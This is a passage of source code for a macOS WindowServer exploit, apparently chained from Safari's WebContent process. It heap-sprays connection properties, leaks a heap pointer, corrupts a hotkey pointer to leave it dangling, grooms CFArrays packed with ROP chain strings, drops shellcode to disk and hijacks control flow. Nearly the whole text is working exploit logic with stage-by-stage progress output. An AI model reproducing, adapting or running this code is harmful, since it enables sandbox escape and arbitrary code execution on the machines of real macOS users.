    CFArrayRef rop_array = CFArrayCreate(NULL, (void *)strs, (*spray_size-0x30)/8, &kCFTypeArrayCallBacks);

    // cleanup
    CFRelease(little_str);
    CFRelease(rop_str);
    free(rop_buffer);

    // return created rop array
    return rop_array;
}

void get_control(uint32_t special_groom)
{
    CFStringRef key_name;

    // free the spray associated with the case that we needed to spray more
    if(special_groom == GROOM_MORE)
    {
        for(int i = 8000; i < 80000; i++)
        {
            CFStringRef key_name = CFStringCreateWithFormat(NULL, NULL, KEY_FORMAT50, ARRAY_SPRAY_ID, i);
            CGSSetConnectionProperty(g_cid, g_cid, key_name, NULL);
            CFRelease(key_name);
        }
        return;
    }

    // free the normal spray
    for(int i = 3000; i < 8000; i++)
    {
        key_name = CFStringCreateWithFormat(NULL, NULL, KEY_FORMAT50, ARRAY_SPRAY_ID, i);
        CGSSetConnectionProperty(g_cid, g_cid, key_name, NULL);
        CFRelease(key_name);
    }
}

//
// Main
//

#define MB_256 0x10000000
#define MB_512 0x20000000

int main()
{
    @autoreleasepool
    {

        uint32_t res = 0;
        uint32_t cid = 0;
        uint32_t offset = 0;
        uint32_t hotkey_index = 0;
        uint64_t leaked_pointer = 0;

        uint32_t leak_keys[LEAK_PROBE_COUNT] = {};
        uint32_t leak_indexes[LEAK_PROBE_COUNT] = {};
        
        uint32_t hotkey_keys[HOTKEY_PROBE_COUNT] = {};
        uint32_t hotkey_indexes[HOTKEY_PROBE_COUNT] = {};
        
        //
        // Phase Zero: Initialization
        //

        printf("[*] Resolving necessary symbols...\n");
        resolve_symbols();

        // register with the windowserver. note that safari should already be
        // 'registered' so we probably won't need to call this :S
        NSApplicationLoad();
  
        if(!pick_cid())
        {
            printf("[-] Failed to select exploit compatible ConnectionID...\n");
            return 2;
        } 
        printf("[+] Accquired exploitable ConnectionID: 0x%X\n", g_cid);
        
        //
        // Phase One: Leak the Heap Layout
        //

        printf("[*] Starting leak spray...\n");
        spray(0, LEAK_SPRAY_COUNT, LEAK_SPRAY_ID, true, false);

        printf("[*] Writing probes into leak spray...\n");
        if(!write_probes(leak_indexes, LEAK_PROBE_START, LEAK_PROBE_COUNT, EXPECTED_DISTANCE))
        {
            printf("[-] Failed to write probes into leak spray...\n");
            return 2;
        }
        printf("[+] Wrote probes into leak spray!\n");

        printf("[*] Locating leak probes...\n");
        if(!locate_leak(LEAK_LOCATE_START, LEAK_SPRAY_COUNT, leak_keys, LEAK_PROBE_COUNT, &leaked_pointer))
        {
            printf("[!] Cache miss, searching remaining spray...\n");
            if(!locate_leak(0, LEAK_LOCATE_START, leak_keys, LEAK_PROBE_COUNT, &leaked_pointer))
            {
                printf("[-] Failed to locate leak probes in spray...\n");
                return 3;
            }
        }
        printf("[+] Found probes! leaked %p in key %u\n", (void *)leaked_pointer, leak_keys[0]);

        //
        // Phase Two: HotKey Feng Shui
        //
        //    let's use science to solve problems.
        //
       
        // this is a rough estimation of our current position in the MALLOC_TINY heap
        uint64_t current = leaked_pointer - (0x400*LEAK_SPRAY_COUNT)/2;

        // if corruption goes smoothly, this is where we expect the dangling hotkey to be
        uint64_t target = (leaked_pointer & 0xFFFFFFFF00000000) + g_cid;
        if(current < target || ((current - target) < MB_512)) // < 512mb is too close for comfort
            target -= 0x100000000;
       
        // compute the distance between our current heap position, and where we predict the
        // dangling hotkey will land. this is approximately how much more data we need to spray.
        uint64_t distance = (uint64_t)(current - target);

        // round up to ensure we spray in chunks of 256mb (0x40001*0x400 == 0x10000400 == ~256mb).
        // this is because the macOS allocator seems to create new heap segments in these increments.
        uint64_t hotkey_spray_count = (((distance / 0x10000350)+1)*0x10000350 + 0x10000350) / 0x400;
        uint64_t hotkey_spray_bytes = hotkey_spray_count*0x400;
        uint64_t hotkey_spray_half_256 = (hotkey_spray_bytes/2) / MB_256;
        uint64_t hotkey_probe_start = LEAK_PROBE_START - (hotkey_spray_half_256-1)*0xAAAAAA;
   
        // every 256mb I can subtract ~ 0xAAAAAA to LEAK_PROBE_START (from blackbox testing)
        uint64_t hotkey_spray_count_mb = (hotkey_spray_count*0x400)/(1024*1024);

        printf("[*] Current spray tip ~%p\n", (void*)current);
        printf("[*] - Need to spray ~%llu more objects to ensure %p\n", hotkey_spray_count, (void*)target);
        printf("[*] Spraying ~%llumb\n", hotkey_spray_count_mb);

        // spray cross-chunk corruptable strings to about the halfway point of our spray target
        printf("[*] Spraying first half (~%llu objects)\n", hotkey_spray_count/2);
        spray(0, hotkey_spray_count/2, HOTKEY_SPRAY_ID, true, true);

        printf("[*] Writing probes into hotkey spray...\n");
        if(!write_probes(hotkey_indexes, hotkey_probe_start, HOTKEY_PROBE_COUNT, 0x7C))
        {
            printf("[-] Failed to write probes into hotkey spray...\n");
            return 4;
        }
        printf("[+] Wrote probes into hotkey spray!\n");

        printf("[*] Locating hotkey probes...\n");
        uint32_t prediction = fast_probe[hotkey_spray_count_mb];
        if(!locate_hotkey_probes(prediction, hotkey_spray_count/2, hotkey_keys, HOTKEY_PROBE_COUNT))
        {
            printf("[!] Cache miss, searching remaining spray...\n");
            if(!locate_hotkey_probes(0, prediction+1, hotkey_keys, HOTKEY_PROBE_COUNT))
            {
                printf("[-] Failed to locate probes in spray...\n");
                return 3;
            }
        }
        printf("[+] Found hotkey probes around key ~%u (in %llu objects, %llumb)\n", hotkey_keys[0], hotkey_spray_count, hotkey_spray_count_mb);
        printf("[*] - Need to spray ~%llu more objects to ensure %p\n", hotkey_spray_count, (void*)target);

        //
        // we will now punch holes in the heap right around the located probes, hoping
        // to fill them in via a small spray of HotKey objects (create_hotkeys())
        // 

        printf("[*] Punching holes for hotkeys in spray...\n");
        punch_hotkey_holes(hotkey_keys, HOTKEY_PROBE_COUNT);
        printf("[*] Allocating new hotkeys...\n");
        create_hotkeys();

        //
        // now we need to finish spraying the (mostly blank) string objects to ensure the
        // 'target' address (what we speculate the dangling pointer to point at) exists.
        //

        printf("[*] Spraying second half...\n");
        spray(hotkey_spray_count/2, hotkey_spray_count, HOTKEY_SPRAY_ID, false, false);
        
        //
        // we have completed <spray 1/2><hotkey objects><spray 2/2>, and hopefully we have
        // aligned HotKey allocations directly after the cross-chunk corruptable strings
        // we probed. now we attempt to perform the cross-chunk corruption, to create
        // a dangling pointer off of an unsuspecting HotKey object.
        //

        printf("[*] Attempting partial overwrite of hotkey pointer...\n");
        if(!corrupt_hotkeys(hotkey_indexes, HOTKEY_PROBE_COUNT))
        {
            printf("[-] FAILURE: Could not corrupt a hotkey pointer...\n");
            return 4;
        }
        printf("[+] Successfully corrupted a hotkey pointer!\n");

        //
        // the last step of this phase is to locate where the dangling pointer has
        // landed within <spray 2/2>. we will look for a connection property that
        // contains a single flipped bit (the hotkey->enabled bit) that we toggled
        // in the corrupt_hotkeys function to confirm successful corruption
        //

        printf("[*] Locating corrupted hotkey in spray...\n");
        prediction = fast_flip[hotkey_spray_count_mb];
        if(!locate_hotkey(prediction, hotkey_spray_count, &hotkey_index, &offset))
        {
            printf("[!] Cache miss, searching remaining spray...\n");
            if(!locate_hotkey(0, prediction+1, &hotkey_index, &offset))
            {
                printf("[-] FAILURE: could not locate corrupted hotkey in spray...\n");
                return 5;
            }
        }

        //
        // at this point, we have located the dangling hotkey and the allocation (one of
        // our sprayed connection property strings) that it overlaps with.
        //

        printf("[+] Found hotkey in %d_%d at offset 0x%X\n", HOTKEY_SPRAY_ID, hotkey_index, offset);
        printf("[i] STATS: %llu mb - %u write - %u flip - 0x%X offset - %llu objs\n",
            hotkey_spray_count_mb, hotkey_keys[0], hotkey_index, offset, hotkey_spray_count);
        
        //
        // Phase 3: CFArray Corruption
        //
      
        // drop some shellcode to disk (from the WebContent process) which we will load
        // into the WindowServer process later, once we have achieved arbitrary rop
        drop_shellcode();

        //
        // generate our ROP chain as large CFString's (MALLOC_LARGE), and then pack them
        // the strings into CFMutableArrays of a specific size.
        //

        uint32_t spray_size = 0;
        uint32_t prev_chunks = 0;
        CFArrayRef rop_array = build_rop_array(offset, &spray_size, &prev_chunks);
        CFStringRef rop_str = CFArrayGetValueAtIndex(rop_array, 0);
        CFStringRef key_name;
  
        // spray some individual ROP chain strings into MALLOC_LARGE to pad it a bit
        for(int i = 0; i < 10000; i++)
        {
            key_name = CFStringCreateWithFormat(NULL, NULL, KEY_FORMAT, BOOKEND_SPRAY_ID, i);
            CGSSetConnectionProperty(g_cid, g_cid, key_name, rop_str);
            CFRelease(key_name);
        }

        //
        // this is where things will get very tricky.
        //
       
        // attempt to groom our crafted arrays under the 'dangling' hotkey
        printf("[*] Grooming with 0x%02X sized arrays, freeing %u chunks...\n", spray_size, prev_chunks);
        groom_array(rop_array, hotkey_index, offset, prev_chunks);

        //
        // evaluate our groom (this is dangerous)
        //

        uint64_t hotkey_id = 0;
        uint64_t big_heap_leak = 0;
        uint32_t special_groom = GROOM_SUCCESS;
        res = evaluate_groom(&hotkey_id, &big_heap_leak);

        //
        // in some cases, it appears the initial array spray may not be enough.
        // this could be dependent on how much we sprayed in the earlier exploit
        // stages but I am not entirely sure.
        //
        // we attempt to spray some more as a fallback and hope this fills in
        // the holes we punched doring the groom_array() call.
        //
        // in even rarer cases, we will have misidentified a GROOM_MORE failure
        // with groom misalignment, although unlikely.
        //

        if(res == GROOM_MORE)
        {
            printf("[*] attempting additional spray...\n");
            for(int i = 8000; i < 80000; i++)
            {
                CFStringRef key_name = CFStringCreateWithFormat(NULL, NULL, KEY_FORMAT50, ARRAY_SPRAY_ID, i);
                CGSSetConnectionProperty(g_cid, g_cid, key_name, rop_array);
                CFRelease(key_name);
            }
            res = evaluate_groom(&hotkey_id, &big_heap_leak);
            special_groom = GROOM_MORE;
        } 

        //
        // this is a difficult case to recover from, and is unlikely to work.
        //
        // basically we tried to groom arrays under the hotkey, and some are there,
        // but not aligned quite as we need them to be. reaching this point means we
        // survived the groom evaluation by sheer luck.
        //
        // we could try to free the arrays we sprayed (and then some...) before spraying
        // a new batch of arrays and hoping they groom into place this time.
        //

        else if(res == GROOM_MISALIGNED)
        {
            printf("[-] array groom misaligned...\n");
            //special_groom = GROOM_MISALIGNED;
            return 6;
        }
          
        // 
        // check once and for-all if our groom attempt(s) were successful
        //

        if(res != GROOM_SUCCESS)
        {
            printf("[-] FAILURE: final array groom failed... sorry bud\n");
            return 7;
        }

        // 
        // Bookend #2
        //

        for(int i = 10000; i < 20000; i++)
        {
            key_name = CFStringCreateWithFormat(NULL, NULL, KEY_FORMAT, BOOKEND_SPRAY_ID, i);
            CGSSetConnectionProperty(g_cid, g_cid, key_name, rop_str);
            CFRelease(key_name);
        }

        //
        // Incredible, we survived the final groom and it looks good! Let's flip
        // a bit in a CFStringRef pointer and ride the gravy train home!
        //
        
        printf("[*] Attempting corruption...\n");
        corrupt_cf_ptr(hotkey_id, big_heap_leak); 
        
        //
        // Phase Four: Code Execution
        //
        
        //printf("Break at %p to debug ROP\n", get_offset("god pivot 1"));
        //printf("Press enter to continue...\n");
        //getchar();

        printf("[*] Hijacking control flow...\n");
        get_control(special_groom);

        printf("[+] Done!\n");
    }

    return 0;
}

